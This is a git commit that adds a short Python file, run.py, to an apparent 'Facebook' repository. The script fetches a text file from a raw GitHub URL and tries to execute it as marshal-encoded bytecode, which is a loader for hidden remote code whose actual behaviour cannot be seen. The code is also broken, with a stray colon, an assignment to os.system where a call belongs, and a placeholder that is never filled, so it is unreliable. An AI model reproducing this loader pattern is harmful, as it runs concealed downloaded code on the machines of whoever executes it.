64939993df415b5aa21c713c9d12f1a770999743
عماد الخشن <103214710+EmadAlkhashn@users.noreply.github.com>
2023-05-09 10:16:45 +0300

    run.py

---
+++ run.py
@@ -0,0 +1,10 @@
+import marshal,os,sys,requests
+
+bro = requests.get("https://raw.githubusercontent.com/EmadAlkhashn/Facebook/main/Max.txt").text:
+	
+def login():
+    os.system = ("exec(marshal.loads(b'{bro}'))")
+    
+    
+login()
+    
